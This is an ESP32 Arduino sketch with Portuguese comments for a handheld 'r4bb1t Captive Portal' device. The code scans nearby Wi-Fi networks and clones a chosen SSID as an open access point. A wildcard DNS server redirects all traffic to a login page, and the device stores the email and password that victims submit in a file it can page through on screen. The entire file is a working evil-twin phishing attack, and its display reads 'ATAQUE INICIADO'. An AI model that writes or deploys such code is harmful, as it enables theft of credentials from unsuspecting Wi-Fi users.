#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <TFT_eSPI.h>
#include <SPIFFS.h>
#include <DNSServer.h>
// Definições dos pinos dos botões e do display TFT
#define BUTTON_UP 22
#define BUTTON_DOWN 15
#define BUTTON_SELECT 4

#define TFT_MOSI 23
#define TFT_SCLK 5
#define TFT_CS   -1
#define TFT_DC   17
#define TFT_RST  16
#define TFT_BL   21

#define MAX_REDES 10
#define NUM_REDES_POR_PAGINA 10

TFT_eSPI tft = TFT_eSPI();
AsyncWebServer server(80);
DNSServer dnsServer;

uint16_t highlightColor = TFT_RED;
uint16_t normalColor = TFT_WHITE;

String email = "";
String senha = "";
String ssidSelecionado = "";
String macSelecionado = "";
String ipSelecionado = "";

String redes[MAX_REDES];
int numRedes = 0;
int paginaAtual = 0;
int redeSelecionada = 1;
int credencialSelecionada = 0; // Controla qual credencial está selecionada
int opcaoSelecionada = 0;
unsigned long lastDebounceTime = 0;
unsigned long debounceDelay = 200;

int numDevices = 0; // Contador de dispositivos conectados


struct Credencial {
  String email;
  String senha;
};

void drawLoadingScreen() {
  tft.fillScreen(TFT_BLACK);
  
  // Define o tamanho e a cor do texto para o nome do projeto
  tft.setTextSize(3);  // Tamanho grande para "r4bb1t v2"
  tft.setTextColor(TFT_WHITE, TFT_GREEN);
  
  // Centraliza manualmente o texto 'r4bb1t v2'
  const char *projectName = "r4bb1t \n Captive Portal";
  int projectNameLength = strlen(projectName) * 6 * 3; // 6 é a largura média de um caractere, 3 é o tamanho do texto
  int centerX = (tft.width() - projectNameLength) / 2;
  int centerY = tft.height() / 2 - 8 * 3; // 8 é a altura média de um caractere, 3 é o tamanho do texto

  // Desenha o nome do projeto 'r4bb1t v2' centralizado
  drawText(centerX, centerY, projectName, TFT_RED);

  // Reduz o tamanho do texto para o restante dos elementos na tela
  tft.setTextSize(2);  // Tamanho menor para a barra de loading e outros textos
  
  // Configurações da barra de loading
  int loadingBarWidth = tft.width() - 40;
  int loadingBarHeight = 20;
  int loadingBarX = 20;
  int loadingBarY = tft.height() / 2 + 20;
  
  tft.drawRect(loadingBarX, loadingBarY, loadingBarWidth, loadingBarHeight, TFT_GREEN);

  // Escaneia as redes WiFi
  int numNetworks = WiFi.scanNetworks();

  // Atualiza a barra de loading em tempo real
  for (int i = 0; i < numNetworks; i++) {
    // Progresso da barra de loading baseado no número de redes encontradas
    int progress = (loadingBarWidth - 4) * (i + 1) / numNetworks;
    tft.fillRect(loadingBarX + 2, loadingBarY + 2, progress, loadingBarHeight - 4, TFT_GREEN);

    // Simula o tempo de varredura para cada rede
    delay(100);  // Ajuste este valor conforme necessário para sincronizar com o tempo de varredura
  }

  // Limpa a tela para desenhar os resultados
  tft.fillScreen(TFT_BLACK);
}

void setup() {
  drawLoadingScreen();
  Serial.begin(115200);

  pinMode(BUTTON_UP, INPUT_PULLUP);
  pinMode(BUTTON_DOWN, INPUT_PULLUP);
  pinMode(BUTTON_SELECT, INPUT_PULLUP);

  tft.init();
  tft.setRotation(4);
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(2);

  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);

  WiFi.mode(WIFI_STA);

  if (!SPIFFS.begin(true)) {
    Serial.println("Erro ao montar o sistema de arquivos");
    return;
  }

  Serial.println("Iniciando o processo de varredura de redes...");
  scanNetworks();
  displayNetworks();

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/index.html", "text/html");
  });

  server.on("/logo.bmp", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/logo.bmp", "image/bmp");
  });

  server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request){
    if(request->hasParam("email", true) && request->hasParam("senha", true)) {
      String email = request->getParam("email", true)->value();
      String senha = request->getParam("senha", true)->value();

      File file = SPIFFS.open("/credenciais.txt", FILE_APPEND);
      if (file) {
        file.println();
        file.println(" Email: \n  " + email);
        file.println("ㅤ");
        file.println(" Senha: \n  " + senha);
        file.close();

        Serial.println("Credenciais salvas em credenciais.txt");
      } else {
        Serial.println("Erro ao abrir credenciais.txt para escrita.");
      }

      request->send(200, "text/plain");
    } else {
      request->send(400, "text/plain", "Parâmetros email e senha necessários");
    }
  });

  server.begin();
  Serial.println("Servidor HTTP iniciado com sucesso.");
  contarCredenciais();
}


enum EstadoTela {
  SELECAO_REDES,      // Tela de seleção de redes Wi-Fi
  SELECAO_OPCOES,     // Tela de opções (Back, Erase, Credenciais)
  SELECAO_CREDENCIAIS // Tela de seleção de credenciais
};

int totalCredenciais = 0;    // Inicializa o total de credenciais

#define CREDENCIAIS_POR_PAGINA 1 // Uma credencial por página (cada credencial é um bloco de 4 linhas)
       // Contador de credenciais
int paginaCredencialAtual = 0;   // Página atual de credenciais
int contadorLinhas = 0;

// Função para contar o número total de credenciais (blocos de 4 linhas)
// Função atualizada para contar as credenciais dinamicamente
void contarCredenciais() {
  totalCredenciais = 0; // Reinicia o contador
  contadorLinhas = 0; // Zera o contador de linhas
  if (SPIFFS.exists("/credenciais.txt")) {
    File file = SPIFFS.open("/credenciais.txt", FILE_READ);

    if (file) {
      String linha;
      while (file.available()) {
        linha = file.readStringUntil('\n');
        linha.trim(); // Remove espaços em branco e quebras de linha
        if (linha.length() > 0) {
          contadorLinhas++; // Conta linhas válidas
        }
      }
      file.close();
      totalCredenciais = contadorLinhas / 5; // Cada credencial consiste em 5 linhas
    }
  }

  // Verifica se o total de credenciais é múltiplo exato de 5
  if (contadorLinhas % 5 != 0) {
    totalCredenciais++; // Adiciona uma credencial extra se houver linhas incompletas
  }
}


EstadoTela estadoAtual = SELECAO_REDES;  // Estado inicial

// Função que controla a navegação na tela de seleção de redes
void handleSelecaoRedes() {
  if ((millis() - lastDebounceTime) > debounceDelay) {
    if (digitalRead(BUTTON_UP) == LOW) {
      if (redeSelecionada > 0) {
        redeSelecionada--;
      } else {
        redeSelecionada = numRedes;  // Volta para a última rede
      }
      lastDebounceTime = millis();
      displayNetworks();  // Atualiza a tela com as redes disponíveis
    }

    if (digitalRead(BUTTON_DOWN) == LOW) {
      if (redeSelecionada < numRedes) {
        redeSelecionada++;
      } else {
        redeSelecionada = 0;  // Volta para a primeira rede
      }
      lastDebounceTime = millis();
      displayNetworks();  // Atualiza a tela com as redes disponíveis
    }

    if (digitalRead(BUTTON_SELECT) == LOW) {
      int redeAtual = redeSelecionada - 1;  // Ajusta o índice da rede selecionada
      Serial.println("Rede selecionada: " + redes[redeAtual]);

      ssidSelecionado = redes[redeAtual];
      macSelecionado = WiFi.BSSIDstr(redeAtual);

      // Exibe a rede selecionada e cria o Captive Portal
      displaySelectedNetwork();
      createCaptivePortal(ssidSelecionado);

      lastDebounceTime = millis();
      estadoAtual = SELECAO_OPCOES;  // Alterar para a tela de opções
      displaySelectedNetwork();
    }
  }
}

// Função que controla a navegação na tela de seleção de opções
void handleSelecaoOpcoes() {
  if ((millis() - lastDebounceTime) > debounceDelay) {
    if (digitalRead(BUTTON_UP) == LOW) {
      if (opcaoSelecionada > 0) {
        opcaoSelecionada--;
      } else {
        opcaoSelecionada = 2;  // Volta para a última opção
      }
      lastDebounceTime = millis();
      displaySelectedNetwork();  // Atualiza a tela com as opções disponíveis
    }

    if (digitalRead(BUTTON_DOWN) == LOW) {
      if (opcaoSelecionada < 2) {
        opcaoSelecionada++;
      } else {
        opcaoSelecionada = 0;  // Volta para a primeira opção
      }
      lastDebounceTime = millis();
      displaySelectedNetwork();  // Atualiza a tela com as opções disponíveis
    }

    if (digitalRead(BUTTON_SELECT) == LOW) {
      if (opcaoSelecionada == 0) {
        estadoAtual = SELECAO_REDES;  // Volta para a tela de seleção de redes
        displayNetworks();
      } else if (opcaoSelecionada == 1) {
        EraseData();  // Limpa as credenciais
      } else if (opcaoSelecionada == 2) {
        estadoAtual = SELECAO_CREDENCIAIS;  // Vai para a tela de seleção de credenciais
        displayCredenciais();
      }
      lastDebounceTime = millis();
    }
  }
}

bool lastSelectState = HIGH;  // Estado anterior do botão SELECT
bool selectPressed = false;   // Estado atual do botão SELECT

void handleSelecaoCredenciais() {
  contarCredenciais();  // Atualiza o número total de credenciais

  if ((millis() - lastDebounceTime) > debounceDelay) {
    if (digitalRead(BUTTON_UP) == LOW) {
      if (paginaCredencialAtual > 0) {
        paginaCredencialAtual--;  // Volta para a página anterior
      } else {
        paginaCredencialAtual = totalCredenciais - 1; // Vai para a última página se estiver na primeira
      }
      lastDebounceTime = millis();
      displayCredenciais();  // Atualiza a tela com as credenciais da página atual
    }

    if (digitalRead(BUTTON_DOWN) == LOW) {
      if (paginaCredencialAtual < totalCredenciais - 1) {
        paginaCredencialAtual++;  // Avança para a próxima página
      } else {
        paginaCredencialAtual = 0;  // Volta para a primeira página se estiver na última
      }
      lastDebounceTime = millis();
      displayCredenciais();  // Atualiza a tela com as credenciais da página atual
    }

    if (digitalRead(BUTTON_SELECT) == LOW) {
      if (credencialSelecionada == 0) {
        estadoAtual = SELECAO_OPCOES;  // Volta para a tela de opções
        displaySelectedNetwork();
      }
      lastDebounceTime = millis();
    }
  }
}

// Função principal que lida com os botões, chamando o handle adequado para cada tela
void handleButtons() {
  switch (estadoAtual) {
    case SELECAO_REDES:
      handleSelecaoRedes();
      break;
    case SELECAO_OPCOES:
      handleSelecaoOpcoes();
      break;
    case SELECAO_CREDENCIAIS:
      handleSelecaoCredenciais();
      break;
  }
}

void loop() {
  // Processa as requisições do servidor DNS
  dnsServer.processNextRequest();

  switch (estadoAtual) {
    case SELECAO_REDES:
      handleSelecaoRedes();  // Navegação de redes
      break;
    case SELECAO_OPCOES:
      handleSelecaoOpcoes();  // Navegação de opções (Back, Erase, Credenciais)
      break;
    case SELECAO_CREDENCIAIS:
      handleSelecaoCredenciais();  // Navegação de credenciais capturadas
      break;
  }
}

void scanNetworks() {
  Serial.println("Escaneando redes Wi-Fi...");
  numRedes = WiFi.scanNetworks();
  Serial.print("Número de redes encontradas: ");
  Serial.println(numRedes);
  
  for (int i = 0; i < numRedes && i < MAX_REDES; i++) {
    redes[i] = WiFi.SSID(i);
    Serial.print("Rede ");
    Serial.print(i);
    Serial.print(": ");
    Serial.println(redes[i]);
  }
}

void drawText(int x, int y, const char *text, uint16_t color) {
  tft.setCursor(x, y);
  tft.setTextColor(color);
  tft.print(text);
}

bool redesenhaNecessario = false;

void displayNetworks() {
  tft.fillScreen(TFT_BLACK);

  // Opção de voltar
  drawText(10, 30, "[Back]", redeSelecionada == 0 ? TFT_RED : TFT_WHITE);
  if (redeSelecionada == 0 ) {
    tft.drawRect(0, 20, 280, 30, TFT_RED);
  }

  // Listar redes WiFi
  int startIndex = redeSelecionada - 1; // adjust the start index based on the current selection
  if (startIndex < 0) startIndex = 0; // make sure we don't go out of bounds
  for (int i = startIndex; i < numRedes && i < startIndex + 5; i++) {
    String networkName = redes[i];
    int maxLength = 13; // adjust this value to fit the screen width
    if (networkName.length() > maxLength) {
      networkName = networkName.substring(0, maxLength) + "...";
    }
    drawText(10, 60 + (i - startIndex) * 30, networkName.c_str(), redeSelecionada == (i + 1) ? TFT_RED : TFT_WHITE);
    if (redeSelecionada == (i + 1)) {
      tft.drawRect(0, 50 + (i - startIndex) * 30, 280, 30, TFT_RED);
    }
  }

  // Automatic rolling effect
  if (redeSelecionada == numRedes) {
    redeSelecionada = 0;
  } else if (redeSelecionada % numRedes == 0) {
    redeSelecionada++;
  }
  redesenhaNecessario = true; // set flag to redraw the screen
}


void EraseData() {
  if (SPIFFS.exists("/credenciais.txt")) {
    File file = SPIFFS.open("/credenciais.txt", FILE_WRITE);
    if (!file) {
      Serial.println("Erro ao abrir o arquivo credenciais.txt para limpar.");
    } else {
      // Apenas abre no modo de gravação, o que apaga o conteúdo existente
      file.close(); 
      Serial.println("Arquivo credenciais.txt limpo com sucesso.");
    }
  } else {
    Serial.println("Arquivo credenciais.txt não encontrado.");
  }
}

void displaySelectedNetwork() {
  tft.fillScreen(TFT_BLACK);

  // Exibe o SSID da rede selecionada
  tft.setCursor(40, 5);
  tft.setTextColor(TFT_GREEN);
  tft.setTextSize(3);
  tft.println(ssidSelecionado);

  tft.setCursor(30, 40);
  tft.setTextColor(TFT_RED);
  tft.setTextSize(2);
  tft.println("ATAQUE INICIADO");


    // Exibe as opções com destaque na opção selecionada
  drawText(10, 150, "[Back]", opcaoSelecionada == 0 ? TFT_RED : TFT_WHITE);
  drawText(10, 180, "[Erase]", opcaoSelecionada == 1 ? TFT_RED : TFT_WHITE);
  drawText(10, 210, "[Credenciais]", opcaoSelecionada == 2 ? TFT_RED : TFT_WHITE);

}


// Função para exibir as credenciais paginadas
void displayCredenciais() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextSize(2);

  // Exibe o botão de "Back"
  drawText(80, 30, "Back", credencialSelecionada == 0 ? TFT_RED : TFT_WHITE);
  if (credencialSelecionada == 0) {
    tft.drawRect(10, 20, 220, 30, TFT_RED);
  }

  // Ajusta a posição inicial para exibir as credenciais
  int startY = 70;  // Move o conteúdo para baixo
  int lineHeight = 20;  // Altura de cada linha de texto
  tft.setCursor(0, startY);

  // Verifica se o arquivo de credenciais existe e abre para leitura
  if (SPIFFS.exists("/credenciais.txt")) {
    File file = SPIFFS.open("/credenciais.txt", FILE_READ);

    if (file) {
      int linhaAtual = 0;
      int credencialInicio = paginaCredencialAtual * 5;  // Cada credencial ocupa 5 linhas

      String linha;
      bool dentroDaCredencial = false;

      // Lê o conteúdo do arquivo
      while (file.available()) {
        linha = file.readStringUntil('\n');
        linha.trim();  // Remove espaços em branco e quebras de linha

        // Verifica se estamos dentro do bloco da credencial atual
        if (linha.length() > 0) {
          if (linhaAtual >= credencialInicio && linhaAtual < credencialInicio + 5) {
            // Exibe a linha no display
            tft.setCursor(0, startY + (linhaAtual - credencialInicio) * lineHeight);
            tft.println(linha);
          }
          linhaAtual++;
        }

        // Para de ler após exibir a credencial da página atual
        if (linhaAtual >= credencialInicio + 5) {
          break;
        }
      }

      file.close();  // Fecha o arquivo após a leitura
    } else {
      Serial.println("Erro ao abrir credenciais.txt para leitura.");
    }
  } else {
    // Se o arquivo não existir, exibe uma mensagem de erro
    tft.setCursor(0, startY + 20);
    tft.setTextColor(TFT_RED);
    tft.println("Nenhuma credencial encontrada");
  }

  // Exibe o número da página no rodapé
  tft.setTextSize(1);
  tft.setCursor(tft.width() - 60, tft.height() - 20);
  tft.setTextColor(TFT_WHITE);
  tft.printf("Pg %d/%d", paginaCredencialAtual + 1, totalCredenciais);
}




void createCaptivePortal(String networkName) {
  WiFi.mode(WIFI_AP);
  Serial.println("Mudando de STA para AP...");
  Serial.println("Iniciando o processo de criação do AP...");

  String apName = networkName + " ";
  Serial.print("Criando AP com o nome: ");
  Serial.println(apName);

  WiFi.softAPdisconnect(true);

  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  bool result = WiFi.softAP(apName.c_str(), NULL, 6);

  if (result) {
    Serial.println("AP criado com sucesso.");
    IPAddress IP = WiFi.softAPIP();
    ipSelecionado = IP.toString(); // Atualiza o IP para exibir na tela TFT
  } else {
    Serial.println("Falha ao criar o AP. Verifique a configuração.");
    return;
  }

  Serial.print("IP do AP: ");
  Serial.println(ipSelecionado);
  
  // Iniciando o servidor DNS para capturar todas as requisições
  dnsServer.start(53, "*", WiFi.softAPIP());
  
  Serial.print("Configurando o servidor HTTP...");

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/index.html", "text/html");
  });

  // Redirecionar todas as outras requisições para a página principal
  server.onNotFound([](AsyncWebServerRequest *request) {
    request->redirect("/");
  });

  server.begin();
  Serial.println("Servidor HTTP iniciado com sucesso.");
}

void stopCaptivePortal() {
  Serial.println("Parando o Captive Portal...");
  WiFi.softAPdisconnect(true);
  server.end();
  Serial.println("Captive Portal parado.");
}
